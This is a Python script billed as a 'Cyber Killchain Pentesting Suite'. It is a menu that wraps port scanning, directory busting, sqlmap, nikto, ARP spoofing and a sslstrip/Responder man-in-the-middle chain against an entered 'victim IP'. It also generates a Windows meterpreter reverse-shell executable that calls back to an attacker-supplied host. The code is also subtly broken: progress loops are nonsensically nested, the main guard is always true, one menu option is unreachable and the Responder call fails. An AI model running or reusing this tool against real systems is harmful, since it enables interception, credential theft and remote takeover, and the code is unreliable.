import os
import subprocess
import sys
import nmap


def scan(ip):
    nm = nmap.PortScanner()
    print("Scanning...")
    nm.scan(ip, '1-65535')
    print(nm.all_hosts())
    for host in nm.all_hosts():
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            for port in lport:
                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
                print('\r[', end='')
                for i in range(1, 101):
                    print('#', end='')
                    if i == 100:
                        print('] 100%')
                    else:
                        print(' ', end='')
                    print('\r[', end='')
                    for i in range(1, 51):
                        print('#', end='')
                        if i == 50:
                            print('] 50%')
                        else:
                            print(' ', end='')
                        print('\r[', end='')
                        for i in range(1, 26):
                            print('#', end='')
                            if i == 25:
                                print('] 25%')
                            else:
                                print(' ', end='')
                            print('\r[', end='')
                            for i in range(1, 11):
                                print('#', end='')
                                if i == 10:
                                    print('] 10%')
                                else:
                                    print(' ', end='')
                                    print('\r[', end='')
                                    for i in range(1, 6):
                                        print('#', end='')
                                        if i == 5:
                                            print('] 5%')
                                        else:
                                            print(' ', end='')
                                            print('\r[', end='')
                                            for i in range(1, 2):
                                                print('#', end='')
                                                if i == 1:
                                                    print('] 1%')
                                                else:
                                                    print(' ', end='')


def dirbust(url):
    print("Directory busting...")
    subprocess.call(['dirb', url])


def sqlmap(url):
    print("SQL injection testing...")
    subprocess.call(['sqlmap', '-u', url])


def nikto(url):
    print("Web server scanning...")
    subprocess.call(['nikto', '-h', url])


def msfvenom():
    print("Creating payload...")
    ip = input("Enter your IP address: ")
    port = input("Enter a port: ")
    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > payload.exe'.format(ip, port))
    print("Payload created: payload.exe")


def arp():
    print("ARP spoofing...")
    victim_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])


def mitm():
    print("MITM attack...")
    victim_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    interface = input("Enter Interface of connection: ")
    subprocess.call(['sslstrip'])
    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
    subprocess.call(f"responder -I  {interface} -P -F -d -b ")


def menu():
    while True:
        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
        print("1. Port Scanning")
        print("2. Directory Busting")
        print("3. SQL Injection Testing")
        print("4. Web Server Scanning")
        print("5. Payload Creation")
        print("6. ARP Spoofing")
        print("7. MITM Attack")
        print("8. Combine Scans and Tools")
        print("9. Exit\n")
        choice = input("Enter your choice: ")

        if choice == '1':
            ip = input("Enter an IP address to scan: ")
            scan(ip)
        elif choice == '2':
            url = input("Enter a URL to scan: ")
            dirbust(url)
        elif choice == '3':
            url = input("Enter a URL to test: ")
            sqlmap(url)
        elif choice == '4':
            url = input("Enter a URL to scan: ")
            nikto(url)
        elif choice == '5':
            msfvenom()
        elif choice == '6':
            arp()
        elif choice == '7':
            mitm()
        elif choice == '8':
            combine()
        elif choice == '9':
            print("Goodbye!")
            sys.exit()
        else:
            print("Invalid choice. Please try again.")


def combine():
    while True:
        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
        print("1. Port Scanning")
        print("2. Directory Busting")
        print("3. SQL Injection Testing")
        print("4. Web Server Scanning")
        print("5. Payload Creation")
        print("6. ARP Spoofing")
        print("7. MITM Attack")
        print("8. Exit\n")
        choice = input("Enter your choice: ")

        if choice == '1':
            ip = input("Enter an IP address to scan: ")
            scan(ip)
        elif choice == '2':
            url = input("Enter a URL to scan: ")
            dirbust(url)
        elif choice == '3':
            url = input("Enter a URL to test: ")
            sqlmap(url)
        elif choice == '4':
            url = input("Enter a URL to scan: ")
            nikto(url)
        elif choice == '5':
            msfvenom()
        elif choice == '6':
            arp()
        elif choice == '7':
            mitm()
        elif choice == '8':
            print("Goodbye!")
            sys.exit()
        elif choice == '9':
            choice = input("Enter the numbers of the tools you want to combine (separated by commas): ")
            choices = choice.split(",")
            for c in choices:
                if c == '1':
                    ip = input("Enter an IP address to scan: ")
                    scan(ip)
                elif c == '2':
                    url = input("Enter a URL to scan: ")
                    dirbust(url)
                elif c == '3':
                    url = input("Enter a URL to test: ")
                    sqlmap(url)
                elif c == '4':
                    url = input("Enter a URL to scan: ")
                    nikto(url)
                elif c == '5':
                    msfvenom()
                elif c == '6':
                    arp()
                elif c == '7':
                    mitm()
                else:
                    print("Invalid choice. Please try again.")
        else:
            print("Invalid choice. Please try again.")


if __name__ == __name__:
    menu()
